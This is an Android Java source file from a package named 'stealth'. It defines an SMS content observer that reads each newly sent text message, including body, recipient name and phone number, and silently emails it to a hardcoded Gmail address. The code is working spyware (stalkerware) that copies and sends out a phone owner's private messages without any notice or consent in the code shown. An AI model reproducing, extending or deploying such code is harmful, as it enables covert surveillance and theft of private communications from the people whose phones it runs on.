package cacafogo.software.stealth.broadcast_receiver.observer;

import cacafogo.software.stealth.ApplicationStuff;
import cacafogo.software.stealth.SendEmailToClient;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class OutgoingSmsObserver extends ContentObserver {
	
	String body;
    String date;
    String person;
    String address;
    String _id;
    String thread_id;
    String protocol;
    String status;
    String type;
    String subject;
    String service_center;
    String locked;
    String error_code;
    String seen;
	
	public OutgoingSmsObserver(Handler handler) {
		super(handler);
		
		Log.d("cacafogo", "in outgoingSmsObserver constructor");
		onChange(true);
	}

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        
        
        // save the message to the SD card here
        Log.d("cacafogo", "outgoingSmsObserver: in the onChange Method");
        
        Uri uriSMSURI = Uri.parse("content://sms/sent");
        Cursor cur = ApplicationStuff.ContentResolver().query(uriSMSURI, null, null, null, null);
         // this will make it point to the first record, which is the last SMS sent
        cur.moveToNext();
        //get informaion on last sms sent
        body = cur.getString(cur.getColumnIndex("body"));
        date = cur.getString(cur.getColumnIndex("date"));
        person = cur.getString(cur.getColumnIndex("person"));
        address = cur.getString(cur.getColumnIndex("address"));
        _id = cur.getString(cur.getColumnIndex("_id"));
        thread_id = cur.getString(cur.getColumnIndex("thread_id"));
        protocol = cur.getString(cur.getColumnIndex("protocol"));
        status = cur.getString(cur.getColumnIndex("status"));
        type = cur.getString(cur.getColumnIndex("type"));
        subject = cur.getString(cur.getColumnIndex("subject"));
        service_center = cur.getString(cur.getColumnIndex("service_center"));
        locked = cur.getString(cur.getColumnIndex("locked"));
        error_code = cur.getString(cur.getColumnIndex("error_code"));
        seen = cur.getString(cur.getColumnIndex("seen"));

        
        //if the date is different from the date of the last message received, then email the new out going message
        if(SmsInfo.getLastSmsSentDate() != Long.parseLong(date)){
        	//email it
        	emailOutgoingSms(person, address, body, date);
        	//update last sms sent
        	SmsInfo.setLastSmsSentDate(Long.parseLong(date));
        }else{
        	SmsInfo.setLastSmsSentDate(Long.parseLong(date));
        }
        
        
        
        // use cur.getColumnNames() to get a list of all available columns...
        // each field that compounds a SMS is represented by a column (phone number, status, etc.)
        // then just save all data you want to the SDcard :)
        
        /*Log.d("cacafogo", "LAST SENT MESSAGE INFORMATION");
        Log.d("cacafogo", "body = " + body);
        Log.d("cacafogo", "date = " + date);
        Log.d("cacafogo", "person = " + person);
        Log.d("cacafogo", "address = " + address);
        Log.d("cacafogo", "_id = " + _id);
        Log.d("cacafogo", "thread_id = " + thread_id);
        Log.d("cacafogo", "protocol = " + protocol);
        Log.d("cacafogo", "status = " + status);
        Log.d("cacafogo", "type = " + type);
        Log.d("cacafogo", "subject = " + subject);
        Log.d("cacafogo", "service_center = " + service_center);
        Log.d("cacafogo", "locked = " + locked);
        Log.d("cacafogo", "error_code = " + error_code);
        Log.d("cacafogo", "seen = " + seen);
        */
        
    }

	
	private void emailOutgoingSms(String person, String address,
			String body, String date) {

			Log.d("cacafogo", "in emailOutgoingSms");
			//email to
			String[] to = {"cacafogo.software@gmail.com"};
			
			//build email body
			String emailBody = "Sent to: " + person + "\n";
			emailBody += "Recipients Phone Number: " + address + "\n"; 
			emailBody += "Message: " + "\n\n"; 
			emailBody += body; 
			
			//send the email
			SendEmailToClient send = new SendEmailToClient();
			
			send.set_to(to);
			send.set_subject("Message Sent");
			send.setBody(emailBody);
			
			try {
				send.send();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}

}
